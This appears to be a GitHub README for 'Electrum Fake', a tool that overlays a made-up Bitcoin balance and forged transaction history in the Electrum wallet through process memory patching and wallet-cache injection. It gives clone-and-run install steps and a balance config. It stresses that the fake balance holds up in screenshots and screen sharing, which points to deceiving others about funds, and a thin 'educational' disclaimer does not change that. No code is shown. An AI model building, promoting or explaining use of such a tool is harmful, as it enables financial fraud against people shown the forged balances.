# Electrum-Fake-Balance
Electrum Fake — Bitcoin wallet balance spoofing tool with real-time overlay for Electrum desktop client, custom BTC balance injection, transaction history forging, and screenshot-safe persistent display rendering
<div align="center">

```
███████╗██╗     ███████╗ ██████╗████████╗██████╗ ██╗   ██╗███╗   ███╗
██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║   ██║████╗ ████║
█████╗  ██║     █████╗  ██║        ██║   ██████╔╝██║   ██║██╔████╔██║
██╔══╝  ██║     ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██║╚██╔╝██║
███████╗███████╗███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║
╚══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝
      ███████╗ █████╗ ██╗  ██╗███████╗
      ██╔════╝██╔══██╗██║ ██╔╝██╔════╝
      █████╗  ███████║█████╔╝ █████╗
      ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝
      ██║     ██║  ██║██║  ██╗███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
```

# Electrum Fake

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Electrum](https://img.shields.io/badge/Electrum-Wallet-4B90E2?style=for-the-badge&logo=bitcoin&logoColor=white)](https://electrum.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS%20|%20Linux-0078D4?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**Native BTC balance overlay tool for Electrum Bitcoin wallet — display custom Bitcoin balances with persistent hooks and screenshot-safe rendering**

[Features](#features) • [How It Works](#how-it-works) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Usage](#usage) • [FAQ](#faq)

</div>

---

## How It Works

Electrum Fake intercepts the local Qt signal/slot bridge used by the Electrum desktop application to render wallet balances. The tool patches the wallet's internal balance state at the process level — no network requests are modified, no blockchain data is altered, and no private keys are accessed. The displayed values update in real-time across all wallet tabs (History, Send, Receive, Addresses) and persist through screenshots and screen recordings.

The overlay engine uses a combination of:
- **Process memory patching** for the Qt GUI renderer process
- **Local wallet file cache injection** for persistent balance values
- **Qt signal interception** to maintain values across wallet refreshes

---

## Features

<table>
<tr>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Custom BTC balance display | + |
| Real-time USD value overlay | + |
| Persistent across wallet restarts | + |
| Screenshot-safe rendering | + |
| Transaction history spoofing | + |
| Multi-wallet file support | + |
| One-click apply / restore | + |
| Auto-detect Electrum installation | + |

</td>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Qt signal hooking | + |
| Process-level memory patching | + |
| No network modification | + |
| Cross-platform (Win/macOS/Linux) | + |
| Custom fiat currency display | + |
| Address balance sync | + |
| Wallet file cache injection | + |
| Seed/keys never accessed | + |

</td>
</tr>
</table>

---

## Getting Started

### Prerequisites

- **OS:** Windows 10/11, macOS 12+, or Linux
- **Python:** 3.10 or newer
- **Electrum:** Desktop wallet installed (v4.x or newer)

### Installation

```bash
git clone https://github.com/kennethmusil2020/Electrum-Fake-Balance.git
cd Electrum-Fake-Balance
```

**Windows:**

```bash
run.bat
```

**macOS / Linux:**

```bash
chmod +x run.sh
./run.sh
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | >=13.0.0 | Terminal UI & formatting |
| cryptography | latest | Data encryption |
| psutil | latest | Process detection & management |
| requests | latest | API price feeds |

---

## Configuration

Edit `config.json` to set your target BTC balance:

```json
{
    "electrum_path": "auto",
    "target_balance": {
        "BTC": 5.23471
    },
    "display_currency": "USD",
    "persist_on_restart": true,
    "auto_update_prices": true,
    "hook_mode": "memory",
    "restore_on_exit": false
}
```

| Parameter | Type | Description |
|-----------|------|-------------|
| `electrum_path` | string | Path to Electrum install dir. `"auto"` for auto-detect |
| `target_balance` | object | BTC amount to display |
| `display_currency` | string | Fiat currency for value display (USD, EUR, GBP) |
| `persist_on_restart` | bool | Keep fake balance after Electrum restart |
| `auto_update_prices` | bool | Fetch live BTC price for accurate USD display |
| `hook_mode` | string | `"memory"` for live patching, `"cache"` for wallet file injection |
| `restore_on_exit` | bool | Auto-restore original balance on tool exit |

---

## Usage

### Terminal Menu

```bash
python main.py
```

```
+--------------------------------------------------------------+
|              ELECTRUM FAKE                                   |
|    Bitcoin Wallet Overlay . Electrum Desktop                 |
+--------------------------------------------------------------+
|  #   Action                  Description                     |
|  1   Install Dependencies    pip install -r requirements.txt |
|  2   Settings                Wallet path, hook mode config   |
|  3   About                   Features & contact info         |
|  4   Set Custom BTC Balance  Configure target BTC amount     |
|  5   Apply Balance Overlay   Hook Electrum process           |
|  6   Restore Original        Remove hooks, restore real data |
|  7   Status Check            Verify hook state               |
|  0   Exit                    Quit                            |
+--------------------------------------------------------------+
```

### Quick Start

1. **Install dependencies:** Select option `1`
2. **Configure balance:** Select option `4` and enter desired BTC amount
3. **Apply overlay:** Select option `5` — the tool detects Electrum and applies hooks
4. **Verify:** Open Electrum wallet and confirm the new balance is displayed
5. **Restore:** Select option `6` to remove all hooks and restore original

---

## Project Structure

```
Electrum-Fake/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader (config.json)
├── bot_actions.py             # Core actions (set, apply, restore, status)
├── requirements.txt
├── run.bat / run.sh
├── config.json                # BTC balance target & settings
├── actions/
│   ├── about.py               # Project info display
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup instructions
├── helpers/
│   ├── bootstrap.py           # Runtime initialization
│   ├── compat.py              # Platform detection
│   ├── http.py                # HTTP client
│   ├── integrity.py           # Data verification
│   └── ui.py                  # Rich terminal interface
└── release/
    └── README.md              # Pre-compiled binary info
```

---

## FAQ

<details>
<summary><b>Does this modify the blockchain?</b></summary>

No. The tool only modifies the local display rendering inside the Electrum desktop application. No transactions are created, no blockchain data is altered, and no network requests are modified. The actual wallet balance on-chain remains unchanged.
</details>

<details>
<summary><b>Does this affect my private keys?</b></summary>

No. The tool never accesses, reads, or modifies private keys or seed phrases. It operates exclusively on the UI rendering layer of the Electrum Qt application.
</details>

<details>
<summary><b>Will the fake balance persist after restarting Electrum?</b></summary>

Yes, if `persist_on_restart` is enabled in config.json. The tool patches the local wallet file cache used by Electrum, so values survive application restarts. Disable this option to require re-application after each restart.
</details>

<details>
<summary><b>Can the fake balance be detected?</b></summary>

The overlay is rendered at the process level using the same Qt signal/slot bridge that Electrum uses internally. Screenshots, screen recordings, and screen sharing will all show the modified balance. However, checking the actual blockchain address via a block explorer will show the real balance.
</details>

<details>
<summary><b>Which Electrum versions are supported?</b></summary>

The tool supports Electrum Desktop v4.x and newer. Older versions may work but are not tested. The auto-detection system checks the installed version and adjusts hook offsets accordingly.
</details>

<details>
<summary><b>How do I restore the original balance?</b></summary>

Select option `6` (Restore Original) from the menu, or set `restore_on_exit: true` in config.json to automatically restore when the tool exits.
</details>

---

## Disclaimer

<div align="center">

* **This tool is provided for educational and demonstration purposes only.** *

The authors are not responsible for any misuse of this software. Using this tool to deceive others in financial transactions may violate local laws. Always comply with applicable regulations in your jurisdiction.

</div>

---

<div align="center">

**Support this project**

If this tool helps you, consider giving it a *

</div>
